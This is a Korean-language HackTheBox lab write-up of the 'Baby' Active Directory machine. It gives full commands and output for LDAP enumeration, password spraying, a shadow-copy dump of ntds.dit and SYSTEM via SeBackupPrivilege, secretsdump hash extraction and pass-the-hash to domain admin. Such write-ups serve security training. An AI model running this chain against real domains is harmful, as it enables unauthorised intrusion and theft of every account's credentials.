---
title: "Baby (Easy)"
date: 2025-11-24
layout: single
excerpt: "Baby는 Easy 난이도의 Windows 머신으로, Active Directory(AD) 환경 침투 시나리오를 다룬다. 이 머신은 공격자가 LDAP 열람, 패스워드 스프레이 공격, 그리고 노출된 인증 정보를 기반으로 한 초기 진입을 시도하게 만든다. 이어서, 권한 상승 단계에서는 SeBackupPrivilege라는 특수 권한을 활용해 시스템 파일을 추출하고, 이를 통해 도메인 관리자 계정의 해시 값을 얻어 최종적으로 관리자 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "Baby"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-windows/baby/baby.png
  teaser_home_page: true
categories: [hackthebox-windows]
tags: [windows, active-directory, ldap, smb, winrm, password-spray, priv-esc, shadow-copy, sebackupprivilege, ntds, secretsdump, pass-the-hash, evil-winrm, impacket]
---

![Guardian](/assets/htb-windows/baby/baby.png)

**Baby**는 Easy 난이도의 Windows 머신으로, **Active Directory(AD) 환경 침투 시나리오**를 다룬다. 

이 머신은 공격자가 `LDAP` 열람, **패스워드 스프레이 공격**, 그리고 노출된 인증 정보를 기반으로 한 초기 진입을 시도하게 만든다. 이어서, 권한 상승 단계에서는 `SeBackupPrivilege`라는 특수 권한을 활용해 시스템의 핵심 파일(`ntds.dit`, `SYSTEM`)을 추출하고, 이를 통해 도메인 관리자 계정의 해시 값을 얻어 최종적으로 관리자 권한을 탈취할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.245.82`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.245.82 | tee nmap 

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 05:22 EST
Nmap scan report for 10.129.245.82
Host is up (0.19s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-24 10:23:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
|_ssl-date: 2025-11-24T10:24:00+00:00; +17s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-24T10:23:20+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-24T10:23:22
|_  start_date: N/A
|_clock-skew: mean: 16s, deviation: 0s, median: 16s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.80 seconds
```

Nmap 스캔 결과, `LDAP(389, 3268)`, `Kerberos(88)`, `SMB(445)`, `WinRM(5985)`, `RDP(3389)` 등의 서비스가 활성화되어 있다.

LDAP 응답을 통해 도메인 이름은 `baby.vl`, 호스트 이름은 `BabyDC.baby.vl` 로 확인되었다.

## Hosts file configuration

도메인 이름 `baby.vl` 및 호스트 이름 `BabyDC.baby.vl` 을 올바르게 해석하기 위해 `/etc/hosts` 파일에 **10.129.245.82 BABYDC.baby.vl baby.vl** 를 추가하였다.

```bash
$ cat /etc/hosts | grep baby

10.129.245.82   BABYDC.baby.vl  baby.vl
```

---

# Vulnerability Analysis

## LDAP Enumeration

도메인 컨트롤러 `BABYDC.baby.vl` 의 LDAP 서비스를 대상으로 전체 디렉터리 정보를 열람하였다.

기본 `Base DN` 은 `dc=baby,dc=vl` 로 설정하고, 모든 오브젝트 클래스를 대상으로 쿼리하였다.

```bash
$ ldapsearch -x -H ldap://BABYDC.baby.vl -b "dc=baby,dc=vl" "(objectClass=*)"

# extended LDIF
#
# LDAPv3
# base <dc=baby,dc=vl> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl

# [SKIP]

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0
```

그중 `Teresa Bell` 이라는 사용자 description 에서 초기 비밀번호 관련 힌트를 확인하였다. 

description 필드에 **Set initial password to BabyStart123!** 라는 문구가 포함되어 있는 것으로 보아, 비밀번호 변경을 안한 사용자들은 **초기 비밀번호(BabyStart123!)** 를 사용할 수 있을 가능성이 보였다.

`dn: CN=...` 형식으로 출력된 사용자 이름을 추출한 뒤, 이를 `이름.성(예: Teresa.Bell)` 형태로 변환하여 비밀번호 스프레이 공격에 사용할 `user.txt` 파일을 생성하였다:

```bash
$ ldapsearch -x -H ldap://BABYDC.baby.vl -b "dc=baby,dc=vl" "(objectClass=*)" uid | grep '^dn: CN=' | awk -F 'CN=' '{print $2}' | awk -F ',' '{print $1}' | sed 's/ /./g' | tee user.txt
```

생성된 사용자 목록은 다음과 같다:

```text
Administrator
Guest
krbtgt
Domain.Computers
Domain.Controllers
Schema.Admins
Enterprise.Admins
Cert.Publishers
Domain.Admins
Domain.Users
Domain.Guests
Group.Policy.Creator.Owners
RAS.and.IAS.Servers
Allowed.RODC.Password.Replication.Group
Denied.RODC.Password.Replication.Group
Read-only.Domain.Controllers
Enterprise.Read-only.Domain.Controllers
Cloneable.Domain.Controllers
Protected.Users
Key.Admins
Enterprise.Key.Admins
DnsAdmins
DnsUpdateProxy
dev
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```

## Password Spraying

앞서 LDAP 열람을 통해 수집한 사용자 목록(`user.txt`)을 기반으로, 초기 비밀번호인 `BabyStart123!` 을 이용하여 `nxc ldap` 명령을 통한 비밀번호 스프레이 공격을 수행하였다.

```bash
$ nxc ldap BABYDC.baby.vl -u user.txt -p 'BabyStart123!' 

LDAP        10.129.245.82   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Administrator:BabyStart123! 
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 

# [SKIP] 

LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.129.245.82   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

`Caroline.Robinson` 계정에선 다음과 같은 메시지가 반환되었다:

```text
STATUS_PASSWORD_MUST_CHANGE
```

이는 **해당 계정의 비밀번호가 초기값 상태이며, 로그인 시 비밀번호 변경이 요구**됨을 의미한다.

`STATUS_PASSWORD_MUST_CHANGE` 가 확인된 `Caroline.Robinson` 계정에 대해, SMB 프로토콜에서도 동일하게 인증 상태를 확인하기 위해 `nxc smb` 명령을 수행하였다.

```bash
$ nxc smb BABYDC.baby.vl -u user.txt -p 'BabyStart123!'  

SMB         10.129.245.82   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Administrator:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\krbtgt:BabyStart123! STATUS_LOGON_FAILURE 

# [SKIP] 

SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.245.82   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```

SMB 결과에서도 해당 계정에 대해 `STATUS_PASSWORD_MUST_CHANGE` 상태가 동일하게 확인되었으며, 비밀번호 변경 이후 정상적인 SMB 인증이 가능하다는 것을 알려준다.

## Password Change

`smbpasswd` 명령어를 이용하여 Caroline.Robinson 사용자의 비밀번호를 성공적으로 변경하였다:

```bash
$ smbpasswd -r 10.129.245.82 -U baby\\Caroline.Robinson  

Old SMB password: BabyStart123!
New SMB password: Asdf1234@
Retype new SMB password: Asdf1234@
Password changed for user Caroline.Robinson
```

비밀번호가 정상적으로 변경된 것을 확인하기 위해, 변경된 자격 증명을 바탕으로 LDAP 인증을 시도하였다:

```bash
$ nxc ldap BABYDC.baby.vl -u Caroline.Robinson -p 'Asdf1234@'

LDAP        10.129.245.82   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.245.82   389    BABYDC           [+] baby.vl\Caroline.Robinson:Asdf1234@ (Pwn3d!)
```

**Pwn3d!** 메시지를 통해 해당 계정으로의 정상 인증 및 접근이 가능함을 확인하였다.

---

# Exploitation

## Remote Shell via WinRM

이후 해당 계정(`Caroline.Robinson`)을 이용하여 WinRM 접속 가능 여부를 확인하였다:

```bash
$ nxc winrm BABYDC.baby.vl -u Caroline.Robinson -p 'Asdf1234@' 

WINRM       10.129.245.82   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.245.82   5985   BABYDC           [+] baby.vl\Caroline.Robinson:Asdf1234@ (Pwn3d!)
```

해당 결과를 통해, **WinRM 포트를 통한 원격 접속**이 가능함을 확인할 수 있다.

`Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속을 시도하였으며, 성공적으로 **Caroline.Robinson 사용자의 PowerShell 세션을 획득**하였다:

![Guardian](/assets/htb-windows/baby/robinson-shell.png)

---

# Privilege Escalation

## Privilege Enumeration

해당 계정의 권한을 확인한 결과 다음과 같은 권한이 활성화되어 있는 것을 확인하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> whoami /priv
                                                                                                                                                                                                                                            
PRIVILEGES INFORMATION                                                                                                                                                                                                                      
----------------------                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Privilege Name                Description                    State                                                                                                                                                                          
============================= ============================== =======                                                                                                                                                                        
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                                                                                                        
SeBackupPrivilege             Back up files and directories  Enabled                                                                                                                                                                        
SeRestorePrivilege            Restore files and directories  Enabled                                                                                                                                                                        
SeShutdownPrivilege           Shut down the system           Enabled                                                                                                                                                                        
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                                                                        
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
```

`whoami /priv` 결과, 해당 계정에 `SeBackupPrivilege` 가 활성화된 상태임을 확인하였다.

## Abusing SeBackupPrivilege

`diskshadow.exe` 명령어를 사용하여 `E:\` 드라이브의 Shadow Copy를 생성하고 민감한 파일을 추출하려고 시도하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  11/25/2025 5:14:36 AM


DISKSHADOW> Error reading from console. Win32 error: 0x(null)
The pipe has been ended.
```

하지만 위와 같이 `diskshadow.exe` 실행 시 콘솔에서 입력을 읽을 수 없다는 에러가 발생하였다.

직접 `diskshadow` 를 실행하는 대신, 명령어를 텍스트 파일로 저장한 뒤 해당 파일을 불러와 실행하는 방식을 사용하였다.

> **[diskshadow 공식 문서](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)를 참조하였다.**

`E:\` 드라이브의 Shadow Copy를 생성하는 명령어를 `diskshadow.txt` 파일에 저장하였다:

```powershell
PS C:\Users\Caroline.Robinson\Documents> cmd /c "(echo set verbose on && echo set metadata C:\Windows\Temp\meta.cab && echo set context clientaccessible && echo set context persistent && echo begin backup && echo add volume C: alias cdrive && echo create && echo expose %cdrive% E: && echo end backup) > diskshadow.txt"
```

`cmd /c` 를 이용한 방식은 **ANSI 인코딩**으로 저장되므로 `diskshadow` 에서 스크립트 내용을 올바르게 읽고 실행할 수 있다.

작성한 `diskshadow.txt` 스크립트를 `/S` 옵션으로 실행하여 Shadow Copy를 생성하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> diskshadow.exe /S diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  11/25/2025 5:26:17 AM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
        + Adding component: \TasksStore

# [SKIP]

Inserted file Dis59F4.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {c0a95756-f3fc-479d-a9b3-43391c7f1af3}

        * Shadow copy ID = {dc95277e-49bc-402b-a5d6-2955aa3e9f66}               %cdrive%
                - Shadow copy set: {c0a95756-f3fc-479d-a9b3-43391c7f1af3}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 11/25/2025 5:26:37 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {dc95277e-49bc-402b-a5d6-2955aa3e9f66}
The shadow copy was successfully exposed as E:\.
-> end backup
```

`C:\` 볼륨의 Shadow Copy가 성공적으로 생성되어 `dir` 명령어를 통하여 `E:\` 드라이브를 본 결과 `Shadow Copy`가 정상적으로 생성되고 드라이브에 노출되었음을 확인하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> dir E:\


    Directory: E:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         4/16/2025   9:17 AM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         4/16/2025   8:35 AM                Program Files
d-----         4/16/2025   9:38 AM                Program Files (x86)
d-r---         7/27/2024  10:27 PM                Users
d-----         8/20/2025   9:07 AM                Windows
```

`E:\` 드라이브에서 도메인 컨트롤러의 핵심 데이터베이스 파일인 `ntds.dit` 을 추출하기 위해 `robocopy` 도구를 사용하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> robocopy /B E:\Windows\NTDS . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, November 25, 2025 5:36:43 AM
   Source : E:\Windows\NTDS\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
            New File              16.0 m        ntds.dit
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           56,488,942 Bytes/sec.
   Speed :            3,232.323 MegaBytes/min.
   Ended : Tuesday, November 25, 2025 5:36:43 AM
```

`ntds.dit` 파일을 성공적으로 복사한 후, 동일한 방식으로 **SYSTEM 레지스트리 하이브 파일**도 `robocopy` 를 이용하여 추출하였다:

```cmd
PS C:\Users\Caroline.Robinson\Documents> robocopy /B E:\Windows\System32\config . SYSTEM

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, November 25, 2025 5:39:54 AM
   Source : E:\Windows\System32\config\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : SYSTEM

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    E:\Windows\System32\config\
            New File              19.9 m        SYSTEM
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   19.95 m   19.95 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           95,554,630 Bytes/sec.
   Speed :            5,467.680 MegaBytes/min.
   Ended : Tuesday, November 25, 2025 5:39:54 AM

```

이 `SYSTEM` 파일은 이후 `ntds.dit` 에서 해시를 추출할 때 필요한 부트 키를 얻는 데 사용된다.

## NTDS Hash Dump and Authentication Bypass

`ntds.dit` 및 `SYSTEM` 파일을 로컬 머신으로 다운로드한 뒤, [secretsdump.py](https://github.com/fortra/impacket)를 이용하여 도메인 사용자들의 해시 값을 추출하였다:

```bash
$ python3 secretsdump.py -ntd ntds.dit -system SYSTEM local

Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::

# [SKIP]

baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:07eddff6f01d7db669c5f15e33b0dd6e406bc93800c321468de5ed05305de7bd
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:cabf457bcdd9f2339ac8288a37743041
baby.vl\Caroline.Robinson:des-cbc-md5:2f2f8ff8d3543238
[*] Cleaning up..
```

`Administrator` 계정의 NTLM 해시를 기반으로, `nxc` 도구를 활용한 인증 우회(`Pass-the-Hash`) 공격을 수행한 결과, 해당 계정으로의 정상 인증 및 접근이 가능함을 확인하였다.

```bash
$ nxc winrm BABYDC.baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
WINRM       10.129.245.82   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.245.82   5985   BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```

이후, `Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속을 시도하였으며, **도메인 관리자 권한의 쉘 획득**에 성공하였다:

![Guardian](/assets/htb-windows/baby/admin-shell.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다.

![Guardian](/assets/htb-windows/baby/flag.png)